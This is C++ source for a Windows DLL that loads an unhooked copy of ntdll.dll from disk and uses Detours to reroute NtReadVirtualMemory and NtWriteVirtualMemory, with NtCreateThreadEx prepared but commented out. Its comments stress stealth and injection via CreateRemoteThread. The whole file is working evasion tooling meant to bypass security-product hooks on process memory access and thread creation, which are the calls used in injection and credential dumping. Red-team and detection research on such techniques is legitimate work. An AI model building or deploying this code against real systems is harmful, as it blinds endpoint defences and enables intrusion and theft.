#include <windows.h>
#include <winternl.h>
#include "detours.h"

using namespace std;

// Global states in-case we re-enter functions we can skip some setup
HANDLE ntSectionHandle = NULL;
PVOID sectionBaseAddress = NULL;

// Prototypes for some undocumented APIs we use
NTSTATUS(NTAPI *ZwCreateSection)
(_Out_ PHANDLE SectionHandle, _In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER MaximumSize, _In_ ULONG SectionPageProtection,
	_In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle);


NTSTATUS(NTAPI *NtMapViewOfSection)
(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize,
	_Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize,
	_In_ DWORD InheritDisposition, _In_ ULONG AllocationType,
	_In_ ULONG Win32Protect);

typedef VOID(__stdcall *_RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;
bool NtdllFunctionsLoaded = false;
HANDLE ntHandle = NULL;
// Load the basic undocumented APIs we may use
BOOL LoadNtdllFunctions() {
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll == NULL)
	{
		return FALSE;
	}
	ZwCreateSection = (NTSTATUS(NTAPI *)(
		PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG,
		HANDLE))GetProcAddress(hNtdll, "ZwCreateSection");
	if (ZwCreateSection == NULL)
	{
		return FALSE;
	}
	NtMapViewOfSection = (NTSTATUS(NTAPI *)(
		HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T,
		DWORD, ULONG, ULONG))GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (NtMapViewOfSection == NULL)
	{
		return FALSE;
	}
	NtdllFunctionsLoaded = true;
	return TRUE;
}
// For PE-parsing the headers differ between versions of windows, we determine which set to use here
#ifdef _WIN64
typedef DWORD64                 POINTER;
typedef PIMAGE_DOS_HEADER       PDOS_HEADER;
typedef PIMAGE_NT_HEADERS64     PNT_HEADER;
typedef PIMAGE_EXPORT_DIRECTORY PEXPORT_DIR;
#else
typedef DWORD                   POINTER;
typedef PIMAGE_DOS_HEADER       PDOS_HEADER;
typedef PIMAGE_NT_HEADERS       PNT_HEADER;
typedef PIMAGE_EXPORT_DIRECTORY PEXPORT_DIR;
#endif

// As we are dealing with flat-files and not relocating the new ntdll, we need to convert virtual address offsets into file offsets
DWORD RvaToOffset(IMAGE_NT_HEADERS * nth, DWORD RVA)
{
	int i;
	int sections;
	PIMAGE_SECTION_HEADER sectionHeader;
	sectionHeader = IMAGE_FIRST_SECTION(nth);
	sections = nth->FileHeader.NumberOfSections;

	for (i = 0; i < sections; i++)
	{
		if (sectionHeader->VirtualAddress <= RVA)
			if ((sectionHeader->VirtualAddress + sectionHeader->Misc.VirtualSize) > RVA)
			{
				RVA -= sectionHeader->VirtualAddress;
				RVA += sectionHeader->PointerToRawData;
				return RVA;
			}
		sectionHeader++;
	}
	return 0;
}
DWORD FindRVA(LPBYTE pFileMap, IMAGE_NT_HEADERS *pNtHdr, DWORD Rva)
{
	// Find the file byte offset for the given RVA
	int i = 0,
		nSections = (int)pNtHdr->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *pSectHdr;

	pSectHdr = (IMAGE_SECTION_HEADER *)((LPSTR)pNtHdr +
		sizeof(IMAGE_NT_HEADERS));
	while ((i < nSections) && ((pSectHdr[i].VirtualAddress +
		pSectHdr[i].Misc.VirtualSize - 1) < Rva)) {
		i++;
	}
	if (((i == nSections) && ((pSectHdr[i].VirtualAddress +
		pSectHdr[i].Misc.VirtualSize - 1) < Rva)) ||
		(pSectHdr[i].VirtualAddress > Rva)) {
		return 0;
	}
	return pSectHdr[i].PointerToRawData +
		Rva - pSectHdr[i].VirtualAddress;
}
DWORD GetExportRVA(LPBYTE pExpSect, DWORD SectRva, char *szFunction)
{
	// Scan the export section to see if the specified function name
	// can be found. If found, we return its RVA.
	DWORD                    i = 0;
	IMAGE_EXPORT_DIRECTORY  *pDir;
	DWORD                   *pNames, *pAddr;
	WORD                    *pOrd;

	pDir = (IMAGE_EXPORT_DIRECTORY *)pExpSect;
	pNames = (DWORD *)(pExpSect +
		(DWORD)pDir->AddressOfNames - SectRva);
	while ((i < pDir->NumberOfNames) && (strcmp((CHAR*)pExpSect +
		(pNames[i] - SectRva), szFunction) != 0)) {
		i++;
	}
	if (i == pDir->NumberOfNames)
		return 0; // Function not found

				  // Get Function ordinal
	pOrd = (WORD *)(pExpSect +
		(DWORD)pDir->AddressOfNameOrdinals - SectRva);

	// Get function address table. Function RVA is at ordinal index
	pAddr = (DWORD *)(pExpSect +
		(DWORD)pDir->AddressOfFunctions - SectRva);
	return pAddr[pOrd[i]];
}

POINTER GetAddress(HMODULE Handle, char* funcName)
{
	POINTER dwAckBase = (POINTER)Handle;
	PDOS_HEADER pIDH = (PDOS_HEADER)dwAckBase;
	PNT_HEADER pINH = (PNT_HEADER)((POINTER)dwAckBase + pIDH->e_lfanew);
	PEXPORT_DIR pIED = (PEXPORT_DIR)(dwAckBase + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD ExpOff = FindRVA((LPBYTE)dwAckBase, pINH, (DWORD)pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD exportRVA = GetExportRVA((LPBYTE)dwAckBase + ExpOff, (DWORD)pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, (char*)funcName);
	POINTER dwFunc = dwAckBase + FindRVA((LPBYTE)dwAckBase, pINH, exportRVA);
	return dwFunc;
}
// Check if process is running with admin permissions, determines if we use sections (more stealthy) or virtualallocs (not stealthy)
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}
PVOID ntdllBuf = NULL;
VOID CALLBACK FileIOCompletionRoutine(
	__in  DWORD dwErrorCode,
	__in  DWORD dwNumberOfBytesTransfered,
	__in  LPOVERLAPPED lpOverlapped
);

VOID CALLBACK FileIOCompletionRoutine(
	__in  DWORD dwErrorCode,
	__in  DWORD dwNumberOfBytesTransfered,
	__in  LPOVERLAPPED lpOverlapped)
{
}
// Returns a non-hooked address of an NTDLL function
__declspec(dllexport) POINTER GetAddressFromName(char* functionName)
{
	// Check some global states in-case we run this function multiple times(optional)
	BOOL resi;
	if (!NtdllFunctionsLoaded)
	{
		resi = LoadNtdllFunctions();
	}
	else {
		resi = true;
	}
	if (!resi)
	{
		return NULL;
	}
	if (ntdllBuf != NULL)
	{
		return GetAddress((HMODULE)ntdllBuf, functionName);
	}
	if (ntSectionHandle == NULL)
	{
		if (ntHandle == NULL)
		{
			ntHandle = CreateFileA(R"(\\?\C:\windows\system32\ntdll.dll)", GENERIC_READ | GENERIC_EXECUTE , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
			if (GetLastError() != 0)
			{
				return NULL;
			}
		}
		OBJECT_ATTRIBUTES ntObjAtt;
		UNICODE_STRING ntPath;
		PCWSTR filePath = L"\\?\c:\windows\system32\ntdll.dll";
		_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
		RtlInitUnicodeString(&ntPath, filePath);
		InitializeObjectAttributes(&ntObjAtt, &ntPath, OBJ_CASE_INSENSITIVE | OBJ_INHERIT, NULL, NULL);
		LARGE_INTEGER ntLargeInt;
		ntLargeInt.u.HighPart = 0;
		ntLargeInt.u.LowPart = 0;
		ntLargeInt.QuadPart = 0;
		BOOL res = GetFileSizeEx(ntHandle, &ntLargeInt);
		if (!res)
		{
			CloseHandle(ntHandle);
			return NULL;
		}
		NTSTATUS status;
		// If we're elevated we can load an un-hooked ntdll in a more stealthy manner
		if (IsElevated())
		{
			status = ZwCreateSection(&ntSectionHandle, SECTION_MAP_EXECUTE, &ntObjAtt, &ntLargeInt, PAGE_EXECUTE, SEC_COMMIT, ntHandle);
			if (!NT_SUCCESS(status))
			{
				CloseHandle(ntHandle);
				return NULL;
			}
		}
		else { // If we're non-elevated we do things the n00b way, improvement can be made here to prevent a single buffer being RWX at any single time
			ntdllBuf = VirtualAlloc(NULL, ntLargeInt.QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			OVERLAPPED ol = { 0 };
			res = ReadFileEx(ntHandle, ntdllBuf, ntLargeInt.QuadPart, &ol, NULL);
			if (!res)
			{
				return NULL;
			}
			else { // If we're not elevated then this function returns here
				return GetAddress((HMODULE)ntdllBuf, functionName);
			}
		} // If we're elevated we continue with the stealthier approach
		LARGE_INTEGER ntSectionOffsetLI;
		PLARGE_INTEGER ntSectionOffset = &ntSectionOffsetLI;
		ntSectionOffset->u.LowPart = NULL;
		ntSectionOffset->u.HighPart = NULL;
		ntSectionOffset->QuadPart = NULL;
		SIZE_T ntSizeofSectionView = 0;
		status = NtMapViewOfSection(ntSectionHandle, GetCurrentProcess(), &sectionBaseAddress, NULL,
			NULL, NULL, &ntSizeofSectionView, ViewShare, NULL, PAGE_EXECUTE);
		if (!NT_SUCCESS(status))
		{
			CloseHandle(ntHandle);
			CloseHandle(ntSectionHandle);
			return NULL;
		}
	}
	if (ntHandle != NULL)
	{
		CloseHandle(ntHandle);
	}
	return GetAddress((HMODULE)sectionBaseAddress, functionName);
}
LONG error;

// Define prototype of functions to hook
NTSTATUS(WINAPI* fNtReadVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
NTSTATUS(WINAPI *fNtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);
NTSTATUS(WINAPI* fNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);

// Create "My" versions of hooked functions that redirect execution to non-hooked versions of that function (prototypes must match)
NTSTATUS MyNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded)
{
	fNtReadVirtualMemory = (NTSTATUS(WINAPI *)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded))GetAddressFromName("NtReadVirtualMemory");
	return fNtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded);
}
NTSTATUS MyNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten)
{
	fNtWriteVirtualMemory = (NTSTATUS(WINAPI *)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten))\
		GetAddressFromName("NtWriteVirtualMemory");
	return fNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}
NTSTATUS MyNtCreateThreadEx(OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer)
{
	fNtCreateThreadEx = (NTSTATUS(WINAPI *)
		(
			OUT PHANDLE hThread,
			IN ACCESS_MASK DesiredAccess,
			IN LPVOID ObjectAttributes,
			IN HANDLE ProcessHandle,
			IN LPTHREAD_START_ROUTINE lpStartAddress,
			IN LPVOID lpParameter,
			IN BOOL CreateSuspended,
			IN ULONG StackZeroBits,
			IN ULONG SizeOfStackCommit,
			IN ULONG SizeOfStackReserve,
			OUT LPVOID lpBytesBuffer
			))GetAddressFromName("NtCreateThreadEx");
	return fNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
}
// Global state to ensure we don't initiate twice
bool init = false;
// Exported initialization so that if we use something like DLL injection we pass this function as a param to e.g. CreateRemoteThread
extern "C"
__declspec(dllexport) BOOL InitializeHooks()
{
	if (init) {
		return TRUE;
	}
		// Hook library initialization
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		// Load address of functions to hook
		fNtReadVirtualMemory = (NTSTATUS(WINAPI *)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded))\
			GetProcAddress(LoadLibraryA("ntdll.dll"), "NtReadVirtualMemory");
		fNtCreateThreadEx = (NTSTATUS(WINAPI *)
			(
				OUT PHANDLE hThread,
				IN ACCESS_MASK DesiredAccess,
				IN LPVOID ObjectAttributes,
				IN HANDLE ProcessHandle,
				IN LPTHREAD_START_ROUTINE lpStartAddress,
				IN LPVOID lpParameter,
				IN BOOL CreateSuspended,
				IN ULONG StackZeroBits,
				IN ULONG SizeOfStackCommit,
				IN ULONG SizeOfStackReserve,
				OUT LPVOID lpBytesBuffer
				))GetProcAddress(LoadLibraryA("ntdll.dll"), "NtCreateThreadEx");
		fNtWriteVirtualMemory = (NTSTATUS(WINAPI* )(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten))\
			GetProcAddress(LoadLibraryA("ntdll.dll"), "NtWriteVirtualMemory");
		// Add hooks
		DetourAttach(&(PVOID&)fNtReadVirtualMemory, MyNtReadVirtualMemory);
		//DetourAttach(&(PVOID&)fNtCreateThreadEx, MyNtCreateThreadEx);
		DetourAttach(&(PVOID&)fNtWriteVirtualMemory, MyNtWriteVirtualMemory);
		// Commit all the hooks
		error = DetourTransactionCommit();
		if (error != NO_ERROR)
		{
			return FALSE;
		}
		init = true;
		return TRUE;
	}

extern "C"
__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return InitializeHooks();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
